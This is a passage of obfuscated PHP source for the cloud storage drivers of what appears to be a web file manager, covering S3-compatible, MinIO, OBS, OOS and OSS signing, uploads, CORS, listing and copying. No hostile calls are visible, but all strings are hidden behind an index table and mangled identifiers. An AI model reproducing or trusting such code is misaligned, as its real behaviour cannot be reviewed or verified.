$«å³›ÍÈ = array($İòŸÉä[248] => $İòŸÉä[12], $İòŸÉä[272] => $µ‘İøÕ, $İòŸÉä[279] => $‰øĞµ™, $İòŸÉä[273] => $•ÛÀ†¡æ, $İòŸÉä[274] => $‰šò©ĞŒ, $İòŸÉä[275] => $ãâŠè«, $İòŸÉä[276] => $ù½˜–ÈÖ, $İòŸÉä[280] => $Ç¼ïÀñœ, $İòŸÉä[258] => $İòŸÉä[249], $İòŸÉä[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($«å³›ÍÈ[$İòŸÉä[258]]); } return $«å³›ÍÈ; } public function uploadMultiData($‰ÈÜ¡, $ê–ïú¹ê = 3600) { $¥Ü¾ÇÕş =& $_SERVER[¶Ô„œ…¯]; $½íìı½ß = $this->signVer == $¥Ü¾ÇÕş[249] ? gmdate($¥Ü¾ÇÕş[281]) : gmdate($¥Ü¾ÇÕş[282]); $Ôƒã˜¶å = array(); $è²î•™æ = $this->client->getUploadId($this->bucket, $‰ÈÜ¡, $Ôƒã˜¶å); if (!$è²î•™æ) { return !1; } $µ©ø¾‡í = array($¥Ü¾ÇÕş[283] => $è²î•™æ, $¥Ü¾ÇÕş[208] => $this->getHost() . $¥Ü¾ÇÕş[8] . $this->pathEncode($‰ÈÜ¡), $¥Ü¾ÇÕş[284] => $½íìı½ß, $¥Ü¾ÇÕş[97] => $‰ÈÜ¡, $¥Ü¾ÇÕş[258] => $this->signVer); if ($this->_isClientAsync()) { unset($µ©ø¾‡í[$¥Ü¾ÇÕş[258]]); } return $µ©ø¾‡í; } public function uploadMultiAuth($²ëë”Õ, $¶â¦–Íø = array()) { $èùãÈ†¤ =& $_SERVER[¶Ô„œ…¯]; if ($this->signVer == $èùãÈ†¤[249]) { if (isset($¶â¦–Íø[$èùãÈ†¤[285]])) { return $this->uploadPartAuthV2($²ëë”Õ, $¶â¦–Íø); } return $this->uploadListAuthV2($²ëë”Õ, $¶â¦–Íø); } if (isset($¶â¦–Íø[$èùãÈ†¤[285]])) { return $this->uploadPartAuthV4($²ëë”Õ, $¶â¦–Íø); } return $this->uploadListAuthV4($²ëë”Õ, $¶â¦–Íø); } private function uploadPartAuthV2($ï¤×ˆßù, $Ø´ÍâºÉ = array()) { $ÜøïŒî =& $_SERVER[¶Ô„œ…¯]; $ÄˆÍ÷¦— = $Ø´ÍâºÉ[$ÜøïŒî[97]]; $ÙİïáÛ· = gmdate($ÜøïŒî[281]); $ºğ›û»Ç = array_intersect_key($Ø´ÍâºÉ, array_flip(array($ÜøïŒî[285], $ÜøïŒî[283]))); ksort($ºğ›û»Ç); $Ç“ƒêÔ¼ = $ºğ›û»Ç ? $ÜøïŒî[76] . http_build_query($ºğ›û»Ç, null, $ÜøïŒî[286], PHP_QUERY_RFC3986) : $ÜøïŒî[12]; $ŸğúÆĞ = array($ÜøïŒî[255], $ÜøïŒî[12], $ÜøïŒî[123], $ÜøïŒî[12], "\170\55\x61\155\172\x2d\144\141\164\145\x3a{$ÙİïáÛ·}", $ÜøïŒî[8] . $this->bucket . $ÜøïŒî[8] . $this->pathEncode($ÄˆÍ÷¦—) . $Ç“ƒêÔ¼); $öÖİ‹ª— = implode($ÜøïŒî[287], $ŸğúÆĞ); $‚ÓÎ×© = $this->client->__getSignature($öÖİ‹ª—); return array($ÜøïŒî[288] => $‚ÓÎ×©, $ÜøïŒî[284] => $ÙİïáÛ·); } private function uploadListAuthV2($Òû²Æ¸°, $ù°ÃÎŒ = array()) { $ĞæÍ™ö =& $_SERVER[¶Ô„œ…¯]; $÷áßÙé = $ù°ÃÎŒ[$ĞæÍ™ö[97]]; $®ƒŸûö‡ = $ù°ÃÎŒ[$ĞæÍ™ö[283]]; $Ãùâº¼ö = $this->client->listParts($this->bucket, $÷áßÙé, $®ƒŸûö‡); if (!$Ãùâº¼ö) { return !1; } $Í²â€ğ” = gmdate($ĞæÍ™ö[281]); $½á»­Ê = $ĞæÍ™ö[289] . $®ƒŸûö‡; $Øáçš„‘ = array($ĞæÍ™ö[290], $ĞæÍ™ö[12], $ĞæÍ™ö[123], $ĞæÍ™ö[12], "\170\55\141\155\172\x2d\x64\141\164\145\72{$Í²â€ğ”}", $ĞæÍ™ö[8] . $this->bucket . $ĞæÍ™ö[8] . $this->pathEncode($÷áßÙé) . $½á»­Ê); $Ì‹ÔƒØå = implode($ĞæÍ™ö[287], $Øáçš„‘); $Â™ú×Ùß = $this->client->__getSignature($Ì‹ÔƒØå); return array($ĞæÍ™ö[288] => $Â™ú×Ùß, $ĞæÍ™ö[284] => $Í²â€ğ”, $ĞæÍ™ö[291] => $Ãùâº¼ö); } private function uploadPartAuthV4($„¢ŠèÉ‚, $†§î‰‹û = array()) { $Ö‡–ÚË§ =& $_SERVER[¶Ô„œ…¯]; $üÈ²½‚ = $†§î‰‹û[$Ö‡–ÚË§[97]]; $Ä«„Üª = array($Ö‡–ÚË§[275] => gmdate($Ö‡–ÚË§[282]), $Ö‡–ÚË§[292] => _get($†§î‰‹û, $Ö‡–ÚË§[293], hash($Ö‡–ÚË§[277], $Ö‡–ÚË§[12]))); $¯Î³Ú¶ñ = explode($Ö‡–ÚË§[210], $this->getHost()); $ë™ƒÕ‰ = array($Ö‡–ÚË§[294] => $¯Î³Ú¶ñ[1], $Ö‡–ÚË§[295] => $Ö‡–ÚË§[12], $Ö‡–ÚË§[248] => $Ö‡–ÚË§[123], $Ö‡–ÚË§[296] => $†§î‰‹û[$Ö‡–ÚË§[79]]); $ĞŞ¶É = $Ö‡–ÚË§[255]; $´ä™Ê›‚ = $Ö‡–ÚË§[8] . $this->pathEncode($üÈ²½‚); $úßıØãµ = array_intersect_key($†§î‰‹û, array_flip(array($Ö‡–ÚË§[285], $Ö‡–ÚË§[283]))); $†â”Ã÷ = $this->client->__getSignatureV4($Ä«„Üª, $ë™ƒÕ‰, $ĞŞ¶É, $´ä™Ê›‚, $úßıØãµ); return array($Ö‡–ÚË§[288] => $†â”Ã÷, $Ö‡–ÚË§[292] => $Ä«„Üª[$Ö‡–ÚË§[292]], $Ö‡–ÚË§[284] => $Ä«„Üª[$Ö‡–ÚË§[275]]); } private function uploadListAuthV4($¬…ö™Àä, $¯ç¨Şëœ = array()) { $‹®·¶” =& $_SERVER[¶Ô„œ…¯]; $äÄ£ƒÛ‰ = $¯ç¨Şëœ[$‹®·¶”[97]]; $¢¤ÙÓÙƒ = $¯ç¨Şëœ[$‹®·¶”[283]]; $‰ÏËá• = $this->client->listParts($this->bucket, $äÄ£ƒÛ‰, $¢¤ÙÓÙƒ); if (!$‰ÏËá•) { return !1; } $¦ÕÂ½ı„ = $‹®·¶”[297]; foreach ($‰ÏËá• as $Å¯šØÛÈ) { $¦ÕÂ½ı„ .= $‹®·¶”[298] . "\x3c\120\x61\x72\x74\116\165\155\x62\x65\162\x3e{$Å¯šØÛÈ[$‹®·¶”[299]]}\74\x2f\120\141\162\x74\116\165\x6d\x62\x65\x72\x3e\xa" . "\74\105\x54\x61\x67\76{$Å¯šØÛÈ[$‹®·¶”[300]]}\x3c\57\x45\x54\141\147\x3e\xa" . $‹®·¶”[301]; } $¦ÕÂ½ı„ .= $‹®·¶”[302]; $ÒÆúã¸ = array($‹®·¶”[275] => gmdate($‹®·¶”[282]), $‹®·¶”[292] => hash($‹®·¶”[277], $¦ÕÂ½ı„)); $ôúêš” = explode($‹®·¶”[210], $this->getHost()); $Æ½£ã…€ = array($‹®·¶”[294] => $ôúêš”[1], $‹®·¶”[248] => $‹®·¶”[123], $‹®·¶”[296] => strlen($¦ÕÂ½ı„)); $“ç‚Îú» = $‹®·¶”[290]; $îÓÎÏã = $‹®·¶”[8] . $this->pathEncode($äÄ£ƒÛ‰); $µ½Áúé = array($‹®·¶”[283] => $¢¤ÙÓÙƒ); $ ûöÙì¤ = $this->client->__getSignatureV4($ÒÆúã¸, $Æ½£ã…€, $“ç‚Îú», $îÓÎÏã, $µ½Áúé); return array($‹®·¶”[288] => $ ûöÙì¤, $‹®·¶”[292] => $ÒÆúã¸[$‹®·¶”[292]], $‹®·¶”[284] => $ÒÆúã¸[$‹®·¶”[275]], $‹®·¶”[291] => $‰ÏËá•); } private function _isClientAsync() { $å´ø õó =& $_SERVER[¶Ô„œ…¯]; static $Šø—ïèÂ = null; if ($Šø—ïèÂ === null) { $çİ°İĞï = isset($_REQUEST[$å´ø õó[303]]) ? json_decode($_REQUEST[$å´ø õó[303]], !0) : !1; $Šø—ïèÂ = $çİ°İĞï && _get($çİ°İĞï, $å´ø õó[304]) == $å´ø õó[305]; } return $Šø—ïèÂ; } public function getHost() { $Ïèï¸ˆ =& $_SERVER[¶Ô„œ…¯]; $ğ’Ú³£ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Ïèï¸ˆ[70], $Ïèï¸ˆ[64], $Ïèï¸ˆ[69], $Ïèï¸ˆ[62]))) { return $ğ’Ú³£ . $Ïèï¸ˆ[8] . $this->bucket; } if ($this->osType == $Ïèï¸ˆ[62] && !is_domain($ğ’Ú³£)) { return $ğ’Ú³£ . $Ïèï¸ˆ[8] . $this->bucket; } $ğ’Ú³£ = explode($Ïèï¸ˆ[210], $ğ’Ú³£); return $ğ’Ú³£[0] . $Ïèï¸ˆ[210] . $this->bucket . $Ïèï¸ˆ[10] . $ğ’Ú³£[1]; } public function size($„ˆêÊÃÔ) { $€Ú„áä = $this->objectMeta($„ˆêÊÃÔ); return $€Ú„áä ? $€Ú„áä[$_SERVER[¶Ô„œ…¯][79]] : 0; } public function info($³–èíŞÎ) { if ($this->isFolder($³–èíŞÎ)) { return $this->folderInfo($³–èíŞÎ); } else { if ($this->isFile($³–èíŞÎ)) { return $this->fileInfo($³–èíŞÎ); } } return !1; } public function exist($âÉÍ’æõ) { return $this->isFile($âÉÍ’æõ) || $this->isFolder($âÉÍ’æõ); } public function isFile($»µÂ ‚Ó) { return !$this->isFolder($»µÂ ‚Ó) && $this->objectMeta($»µÂ ‚Ó); } public function isFolder($ş€Åí¦Ù) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][179], $ş€Åí¦Ù); } protected function objectMeta($ş¡€·‹Ş) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][181], $ş¡€·‹Ş); } protected function _objectMeta($–çšŞ¤³) { $­’¨’Ë´ =& $_SERVER[¶Ô„œ…¯]; $–çšŞ¤³ = rtrim($–çšŞ¤³, $­’¨’Ë´[8]); try { $‚àİÑ = $this->client->getObjectInfo($this->bucket, $–çšŞ¤³); if (!isset($‚àİÑ[$­’¨’Ë´[254]]) && isset($‚àİÑ[$­’¨’Ë´[306]])) { $‚àİÑ[$­’¨’Ë´[254]] = $‚àİÑ[$­’¨’Ë´[306]]; } } catch (Exception $›Âğœ›Š) { $‚àİÑ = !1; } if (!$‚àİÑ) { } return $‚àİÑ; } protected function _isFolder($‡’íÖØÜ) { $®ÙˆÂŠÔ =& $_SERVER[¶Ô„œ…¯]; $‡’íÖØÜ = rtrim($‡’íÖØÜ, $®ÙˆÂŠÔ[8]) . $®ÙˆÂŠÔ[8]; if ($‡’íÖØÜ == $®ÙˆÂŠÔ[12] || $‡’íÖØÜ == $®ÙˆÂŠÔ[8]) { return !0; } $¶êç™¶æ = $this->client->getBucket($this->bucket, $‡’íÖØÜ, null, 1); if (empty($¶êç™¶æ[$®ÙˆÂŠÔ[238]])) { return !1; } $¶â¦ú— = $¶êç™¶æ[$®ÙˆÂŠÔ[238]][0][$®ÙˆÂŠÔ[32]]; return stripos($¶â¦ú—, $‡’íÖØÜ) === 0 ? !0 : !1; if (substr($¶â¦ú—, -1) == $®ÙˆÂŠÔ[8]) { return !0; } if (get_path_this($¶â¦ú—) == get_path_this($‡’íÖØÜ)) { return !1; } return !0; } public function listObject($¯¾´ÂŞ) { return $this->fileList($¯¾´ÂŞ, $_SERVER[¶Ô„œ…¯][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($÷ô»‚•ò) { $·»™ÂÒó =& $_SERVER[¶Ô„œ…¯]; parent::__construct($÷ô»‚•ò); $this->setSignVersion($·»™ÂÒó[249]); if (!$this->region) { $this->region = $·»™ÂÒó[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ïåÚ•´á = $this->getBktRegion(); return $this->region == $ïåÚ•´á ? !0 : !1; } public function uploadFormData($¥üšÉò, $¸‚¨Òİ… = 3600) { $ôæšó“« =& $_SERVER[¶Ô„œ…¯]; $¶øş–Ñ = $ôæšó“«[231]; $Ãş¿“´× = $ôæšó“«[259]; $ğ¼Ô‚ˆ = $ôæšó“«[62]; $¼®ÓºïÕ = gmdate($ôæšó“«[260]); $ÍõÏ£¹¢ = gmdate($ôæšó“«[261]); $äõôÎŞ– = $ôæšó“«[262]; $ú¤…­ıÒ = $¸‚¨Òİ… . $ôæšó“«[12]; $ş­ïé¡Ë = $ôæšó“«[263]; $Øó•Ç‹… = array($this->accessKey, $ÍõÏ£¹¢, $this->region, $ğ¼Ô‚ˆ, $äõôÎŞ–); $–Ê¤®°Í = implode($ôæšó“«[8], $Øó•Ç‹…); $õœÅôŒ = array($ôæšó“«[264] => gmdate($ôæšó“«[265], strtotime($ôæšó“«[266])), $ôæšó“«[267] => array(array($ôæšó“«[268] => $this->bucket), array($ôæšó“«[308] => $¶øş–Ñ), array($ôæšó“«[269], $ôæšó“«[270], $ôæšó“«[12]), array($ôæšó“«[269], $ôæšó“«[271], $ôæšó“«[12]), array($ôæšó“«[269], $ôæšó“«[309], $ôæšó“«[12]), array($ôæšó“«[272] => $ş­ïé¡Ë), array($ôæšó“«[273] => $–Ê¤®°Í), array($ôæšó“«[274] => $Ãş¿“´×), array($ôæšó“«[275] => $¼®ÓºïÕ), array($ôæšó“«[276] => $ú¤…­ıÒ))); $­ı—¿ª = base64_encode(json_encode($õœÅôŒ)); $òÊ×«® = hash_hmac($ôæšó“«[277], $ÍõÏ£¹¢, $ôæšó“«[278] . $this->secret, !0); $²¬«õ½Ç = hash_hmac($ôæšó“«[277], $this->region, $òÊ×«®, !0); $õ´¡Ûçè = hash_hmac($ôæšó“«[277], $ğ¼Ô‚ˆ, $²¬«õ½Ç, !0); $†õ¢×Ê = hash_hmac($ôæšó“«[277], $äõôÎŞ–, $õ´¡Ûçè, !0); $¦„±”ñ = hash_hmac($ôæšó“«[277], $­ı—¿ª, $†õ¢×Ê); $ßîœ–÷ = array($ôæšó“«[248] => $ôæšó“«[12], $ôæšó“«[296] => $ôæšó“«[12], $ôæšó“«[308] => $¶øş–Ñ, $ôæšó“«[272] => $ş­ïé¡Ë, $ôæšó“«[279] => $­ı—¿ª, $ôæšó“«[310] => $–Ê¤®°Í, $ôæšó“«[311] => $Ãş¿“´×, $ôæšó“«[312] => $¼®ÓºïÕ, $ôæšó“«[313] => $ú¤…­ıÒ, $ôæšó“«[314] => $¦„±”ñ, $ôæšó“«[208] => $this->getHost()); return $ßîœ–÷; } } goto c¦Ò§ˆÍ¼º; dÖ›ËË: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($«…ÄÊäá) { parent::__construct($«…ÄÊäá); $this->setSignVersion($_SERVER[¶Ô„œ…¯][249]); } public function fileOutImage($’¶°œË, $î¿’–İÇ = 250) { $’Ò¾Ìë =& $_SERVER[¶Ô„œ…¯]; if ($this->size($’¶°œË) > 1024 * 1024 * 25) { return $this->fileOutImageServer($’¶°œË, $î¿’–İÇ); } $ƒ—©½ë = array($’Ò¾Ìë[1468] => $’Ò¾Ìë[1469] . $î¿’–İÇ . $’Ò¾Ìë[1470]); $Âº¦ñğ = $this->link($’¶°œË, $ƒ—©½ë); $this->fileOutLink($Âº¦ñğ); } public function fileOutLink($È´©˜¹Ú) { $Ş¢É¥íÍ =& $_SERVER[¶Ô„œ…¯]; if (substr($È´©˜¹Ú, 0, 7) == $Ş¢É¥íÍ[218]) { $È´©˜¹Ú = $Ş¢É¥íÍ[219] . substr($È´©˜¹Ú, 7); } header($Ş¢É¥íÍ[175] . $È´©˜¹Ú); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($„†ã›ˆ–) { parent::__construct($„†ã›ˆ–); $this->setSignVersion($_SERVER[¶Ô„œ…¯][249]); } public function fileOutLink($±É×²Üù) { $¿‘ÑÙ¬î =& $_SERVER[¶Ô„œ…¯]; if (substr($±É×²Üù, 0, 7) == $¿‘ÑÙ¬î[218]) { $±É×²Üù = $¿‘ÑÙ¬î[219] . substr($±É×²Üù, 7); } header($¿‘ÑÙ¬î[175] . $±É×²Üù); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($‘Öœš•ä) { parent::__construct(); include_once SDK_DIR . $_SERVER[¶Ô„œ…¯][1471]; $this->_init($‘Öœš•ä); } public function _init($Í²¹öÈ‡) { $¥¢õûÃá =& $_SERVER[¶Ô„œ…¯]; $this->config = $Í²¹öÈ‡; foreach ($Í²¹öÈ‡ as $¿õÄ•‚ => $ˆ­ ©ÒÔ) { if (isset($this->{$¿õÄ•‚})) { $this->{$¿õÄ•‚} = $ˆ­ ©ÒÔ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¥¢õûÃá[1472] . LNG($¥¢õûÃá[1473])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¨Ğ‹—€Ñ =& $_SERVER[¶Ô„œ…¯]; $èÅ‚ÄÂ = new OSS\Model\CorsConfig(); $Äà˜Äô¬ = new OSS\Model\CorsRule(); $Äà˜Äô¬->addAllowedOrigin($¨Ğ‹—€Ñ[1474]); $Äà˜Äô¬->addAllowedMethod($¨Ğ‹—€Ñ[1475]); $Äà˜Äô¬->addAllowedMethod($¨Ğ‹—€Ñ[1476]); $Äà˜Äô¬->addAllowedMethod($¨Ğ‹—€Ñ[1477]); $Äà˜Äô¬->addAllowedMethod($¨Ğ‹—€Ñ[1478]); $Äà˜Äô¬->addAllowedMethod($¨Ğ‹—€Ñ[165]); $Äà˜Äô¬->setMaxAgeSeconds(600); $Äà˜Äô¬->addExposeHeader($¨Ğ‹—€Ñ[1479]); $Äà˜Äô¬->addAllowedHeader($¨Ğ‹—€Ñ[1474]); $èÅ‚ÄÂ->addRule($Äà˜Äô¬); try { $this->client->putBucketCors($this->bucket, $èÅ‚ÄÂ); } catch (OSS\Core\OssException $Şüõ¥Ì) { $this->writeLog(__FUNCTION__ . $¨Ğ‹—€Ñ[214] . $Şüõ¥Ì->getMessage()); return !1; } return !0; } public function getBucketCors() { $²ˆ±ş§á =& $_SERVER[¶Ô„œ…¯]; $ˆáÌ²åÇ = null; try { $ˆáÌ²åÇ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¦ŞôâĞâ) { $this->writeLog(__FUNCTION__ . $²ˆ±ş§á[214] . $¦ŞôâĞâ->getMessage()); return null; } if (!$ˆáÌ²åÇ || !($êÜÕÆ± = $ˆáÌ²åÇ->getRules())) { return null; } $ô…ğßûù = $êÜÕÆ±[0]->getAllowedOrigins(); $ÖÂÙ¡Á = $êÜÕÆ±[0]->getAllowedMethods(); $¸ßÁë˜ = $êÜÕÆ±[0]->getMaxAgeSeconds(); $¿®ëÂŸ€ = $êÜÕÆ±[0]->getExposeHeaders(); $ä£ÇÆ£° = $êÜÕÆ±[0]->getAllowedHeaders(); return array($²ˆ±ş§á[220] => isset($ô…ğßûù[0]) ? $ô…ğßûù[0] : $²ˆ±ş§á[12], $²ˆ±ş§á[224] => $ÖÂÙ¡Á, $²ˆ±ş§á[1480] => $¸ßÁë˜, $²ˆ±ş§á[1481] => isset($¿®ëÂŸ€[0]) ? $¿®ëÂŸ€[0] : $²ˆ±ş§á[12], $²ˆ±ş§á[221] => isset($ä£ÇÆ£°[0]) ? $ä£ÇÆ£°[0] : $²ˆ±ş§á[12]); } public function isBucketCors() { $‚ÆúŠø =& $_SERVER[¶Ô„œ…¯]; $¼ìáùÓÑ = $this->getBucketCors(); if (!$¼ìáùÓÑ || !is_array($¼ìáùÓÑ)) { return !1; } if ($¼ìáùÓÑ[$‚ÆúŠø[220]] != $‚ÆúŠø[222] || $¼ìáùÓÑ[$‚ÆúŠø[221]] != $‚ÆúŠø[222]) { return !1; } $…†ÇŞ› = array_map($‚ÆúŠø[223], $¼ìáùÓÑ[$‚ÆúŠø[224]]); if (!is_array($…†ÇŞ›)) { $…†ÇŞ› = array(); } $ûµ®¡ = array($‚ÆúŠø[225], $‚ÆúŠø[226], $‚ÆúŠø[227], $‚ÆúŠø[228], $‚ÆúŠø[229]); $ÅÖĞ›ùë = array_diff($ûµ®¡, $…†ÇŞ›); return empty($ÅÖĞ›ùë); } public function mkfile($¦Ü–™·è, $şüçŒ = '', $ª…ç“’ = REPEAT_RENAME) { $±ªš—†í = $this->setContent($¦Ü–™·è, $şüçŒ); if ($±ªš—†í !== !1) { return $this->getPathOuter($¦Ü–™·è); } return !1; } public function mkdir($Æñªšßü, $¸Ø‡è¿ = REPEAT_SKIP) { if ($¸Ø‡è¿ && $this->_isFolder($Æñªšßü)) { return $this->getPathOuter($Æñªšßü); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Æñªšßü)); } catch (OSS\Core\OssException $ÕÕôˆî¹) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][214] . $ÕÕôˆî¹->getMessage()); return !1; } return $this->getPathOuter($Æñªšßü); } private function fileList($—ı²¨Ğ¦, $Ñ–Öß‹¾ = '', $´‡Ôµà = 0) { $ºÔÀÙ¿ =& $_SERVER[¶Ô„œ…¯]; $—ı²¨Ğ¦ = trim($—ı²¨Ğ¦, $ºÔÀÙ¿[8]); $·´ŞŸÏŒ = empty($—ı²¨Ğ¦) && $—ı²¨Ğ¦ !== $ºÔÀÙ¿[230] ? $ºÔÀÙ¿[12] : $—ı²¨Ğ¦ . $ºÔÀÙ¿[8]; $¥•©¦Š = $ºÔÀÙ¿[12]; $‹ãæÅÔ† = 1000; $„‚ø•½Š = $Ùß’úë = array(); while (!0) { check_abort(); $ØÑîİ€ = array($ºÔÀÙ¿[1482] => $Ñ–Öß‹¾, $ºÔÀÙ¿[1483] => $·´ŞŸÏŒ, $ºÔÀÙ¿[1484] => $‹ãæÅÔ†, $ºÔÀÙ¿[1485] => $¥•©¦Š); try { $Í®–ˆ¹µ = $this->client->listObjects($this->bucket, $ØÑîİ€); } catch (OSS\Core\OssException $™ù¤îÊú) { $this->writeLog(__FUNCTION__ . $ºÔÀÙ¿[214] . $™ù¤îÊú->getMessage()); break; } $¥•©¦Š = $Í®–ˆ¹µ->getNextMarker(); $˜ë¶§æÖ = $Í®–ˆ¹µ->getObjectList(); $‰ÕœÓÜ¯ = $Í®–ˆ¹µ->getPrefixList(); foreach ($˜ë¶§æÖ as $úâÃä) { if ($úâÃä->getKey() == $·´ŞŸÏŒ) { continue; } $Ş†’œûê = $úâÃä->getKey(); $Èã×Î“ô = $úâÃä->getSize(); $°ÎñÛåÏ = $úâÃä->getLastModified(); $õÁÌÆó = trim($úâÃä->getETag(), $ºÔÀÙ¿[121]); $œòÂ‰ß = $´‡Ôµà ? array($ºÔÀÙ¿[32] => $Ş†’œûê, $ºÔÀÙ¿[79] => $Èã×Î“ô, $ºÔÀÙ¿[206] => strtotime($°ÎñÛåÏ), $ºÔÀÙ¿[1486] => $õÁÌÆó) : $Ş†’œûê; $ÜÊøï—Í = $Èã×Î“ô == 0 && substr($Ş†’œûê, strlen($Ş†’œûê) - 1, 1) == $ºÔÀÙ¿[8] ? !0 : !1; $™”¹”Æ = array($ºÔÀÙ¿[79] => $Èã×Î“ô, $ºÔÀÙ¿[1487] => $Èã×Î“ô, $ºÔÀÙ¿[88] => strtotime($°ÎñÛåÏ), $ºÔÀÙ¿[1488] => $°ÎñÛåÏ, $ºÔÀÙ¿[1486] => $õÁÌÆó); $this->cacheMethodInfoSet($Ş†’œûê, $ÜÊøï—Í, $™”¹”Æ); if ($ÜÊøï—Í) { $„‚ø•½Š[] = $Ş†’œûê; continue; } $Ùß’úë[] = $œòÂ‰ß; } foreach ($‰ÕœÓÜ¯ as $‚ë·œ×‚) { $„‚ø•½Š[] = $‚ë·œ×‚->getPrefix(); $this->cacheMethodInfoSet($‚ë·œ×‚->getPrefix(), !0); } if ($¥•©¦Š === $ºÔÀÙ¿[12]) { break; } } $this->cacheMethodInfoSet($—ı²¨Ğ¦, !0); return array($ºÔÀÙ¿[85] => $„‚ø•½Š, $ºÔÀÙ¿[86] => $Ùß’úë); } public function listObject($»°Ã±È¡, $æ™îãí” = '') { $ŸäÖÏ‘– =& $_SERVER[¶Ô„œ…¯]; $»°Ã±È¡ = trim($»°Ã±È¡, $ŸäÖÏ‘–[8]); $°Ò¼¯™ï = empty($»°Ã±È¡) && $»°Ã±È¡ !== $ŸäÖÏ‘–[230] ? $ŸäÖÏ‘–[12] : $»°Ã±È¡ . $ŸäÖÏ‘–[8]; $‹õ£‹Ñİ = $ŸäÖÏ‘–[12]; $’šÌ«şƒ = 1000; $¢Ô«¸— = $›¿ÈË€õ = array(); while (!0) { check_abort(); $Óœ…““ = array($ŸäÖÏ‘–[1482] => $æ™îãí”, $ŸäÖÏ‘–[1483] => $°Ò¼¯™ï, $ŸäÖÏ‘–[1484] => $’šÌ«şƒ, $ŸäÖÏ‘–[1485] => $‹õ£‹Ñİ); try { $»öíºĞÎ = $this->client->listObjects($this->bucket, $Óœ…““); } catch (OSS\Core\OssException $ÂÑ™¯ıÓ) { $this->writeLog(__FUNCTION__ . $ŸäÖÏ‘–[214] . $ÂÑ™¯ıÓ->getMessage()); break; } $‹õ£‹Ñİ = $»öíºĞÎ->getNextMarker(); $Ùô¢Šô– = $»öíºĞÎ->getObjectList(); foreach ($Ùô¢Šô– as $›‘©­ªš) { if ($›‘©­ªš->getKey() == $°Ò¼¯™ï) { continue; } $…¼Š‰¨ç = $›‘©­ªš->getKey(); $‚ùº§°… = $›‘©­ªš->getSize(); $Îğêéí = $‚ùº§°… == 0 && substr($…¼Š‰¨ç, strlen($…¼Š‰¨ç) - 1, 1) == $ŸäÖÏ‘–[8] ? !0 : !1; if ($Îğêéí) { continue; } $›¿ÈË€õ[] = $‚ùº§°… . $ŸäÖÏ‘–[214] . $…¼Š‰¨ç; } if ($‹õ£‹Ñİ === $ŸäÖÏ‘–[12]) { break; } } return array($ŸäÖÏ‘–[85] => $¢Ô«¸—, $ŸäÖÏ‘–[86] => $›¿ÈË€õ); } public function copyFile($íô™şé, $…¶Ü‚ªö) { $¦ÓµÓÉÊ = $this->size($íô™şé); if ($¦ÓµÓÉÊ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $íô™şé, $this->bucket, $this->pathEncode($…¶Ü‚ªö)); } catch (OSS\Core\OssException $µ‚Œ’±…) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][214] . $µ‚Œ’±…->getMessage()); return !1; } return $this->getPathOuter($…¶Ü‚ªö); } $ÏÄÑ‰õú = $this->multiCopyObject($íô™şé, $…¶Ü‚ªö, $¦ÓµÓÉÊ); return $ÏÄÑ‰õú ? $this->getPathOuter($…¶Ü‚ªö) : !1; } private function multiCopyObject($Âûüô“, $Ş§ÀŸü¤, $ùèˆîøÇ) { $üÌèÄõ =& $_SERVER[¶Ô„œ…¯]; try { $šô¤Êİø = array(); if ($­Šš÷Ê = $this->hashMd5($Âûüô“)) { $šô¤Êİø = array(OSS\OssClient::OSS_HEADERS => array($üÌèÄõ[1489] => $­Šš÷Ê)); } $ßÀ´¶·› = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ş§ÀŸü¤), $šô¤Êİø); $ªÀ¡¢‘ = 1; $éœûìÔä = 0; $ì‹÷â’Á = array(); $ãĞµß­Ë = 1024 * 1024 * 10; $ÆÑ–ÁüÀ = $this->client->generateMultiuploadParts($ùèˆîøÇ, $ãĞµß­Ë); foreach ($ÆÑ–ÁüÀ as $ä¿ÖÒşÜ => $¿óôŠÒ’) { $ı·Û–©Ó = $éœûìÔä + (int) $¿óôŠÒ’[$üÌèÄõ[1490]]; $Œ¥èşŞ× = (int) $¿óôŠÒ’[$üÌèÄõ[414]] + $ı·Û–©Ó - 1; $éËØ‰ìú = array($üÌèÄõ[167] => $ı·Û–©Ó, $üÌèÄõ[168] => $Œ¥èşŞ×); $ì‹÷â’Á[] = $this->client->uploadPartCopy($this->bucket, $Âûüô“, $this->bucket, $this->pathEncode($Ş§ÀŸü¤), $ªÀ¡¢‘, $ßÀ´¶·›, $éËØ‰ìú); $ªÀ¡¢‘ = $ªÀ¡¢‘ + 1; } $ìÇışë¯ = array(); foreach ($ì‹÷â’Á as $ä¿ÖÒşÜ => $‰¸²Š€º) { $ìÇışë¯[] = array($üÌèÄõ[299] => $ä¿ÖÒşÜ + 1, $üÌèÄõ[300] => $‰¸²Š€º); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ş§ÀŸü¤), $ßÀ´¶·›, $ìÇışë¯); } catch (OSS\Core\OssException $×»üÕæÖ) { $this->writeLog(__FUNCTION__ . $üÌèÄõ[214] . $×»üÕæÖ->getMessage()); return !1; } return !0; } public function moveFile($ˆÖÍ , $‘‰µÇ¶Ë) { if ($this->copyFile($ˆÖÍ , $‘‰µÇ¶Ë)) { $this->remove($ˆÖÍ ); return $this->getPathOuter($‘‰µÇ¶Ë); } return !1; } public function 